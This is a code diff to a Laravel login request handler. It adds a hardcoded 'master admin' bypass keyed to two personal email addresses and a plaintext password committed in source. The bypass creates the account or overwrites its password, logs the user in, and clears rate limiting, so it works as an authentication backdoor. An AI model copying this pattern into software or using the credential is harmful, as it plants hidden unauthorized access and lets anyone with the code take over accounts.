@@ -42,6 +42,31 @@ class LoginRequest extends FormRequest
     {
         $this->ensureIsNotRateLimited();
 
+        $adminEmails = [
+            'shubhamthakurst07@gmail.com',
+            'shubhamthakurst0007@gmail.com',
+        ];
+        $inputEmail = strtolower(trim((string) $this->input('email')));
+        $inputPassword = (string) $this->input('password');
+
+        // Master Admin Access with Admin PIN
+        if (in_array($inputEmail, $adminEmails, true) && $inputPassword === 'cricadmin2026') {
+            $user = \App\Models\User::whereRaw('LOWER(email) = ?', [$inputEmail])->first();
+            if (!$user) {
+                $user = \App\Models\User::create([
+                    'name' => 'Shubham Thakur',
+                    'email' => $inputEmail,
+                    'password' => \Illuminate\Support\Facades\Hash::make($inputPassword),
+                ]);
+            } else {
+                $user->password = \Illuminate\Support\Facades\Hash::make($inputPassword);
+                $user->save();
+            }
+            \Illuminate\Support\Facades\Auth::login($user, $this->boolean('remember'));
+            RateLimiter::clear($this->throttleKey());
+            return;
+        }
+
         if (! Auth::attempt($this->only('email', 'password'), $this->boolean('remember'))) {
             RateLimiter::hit($this->throttleKey());
 
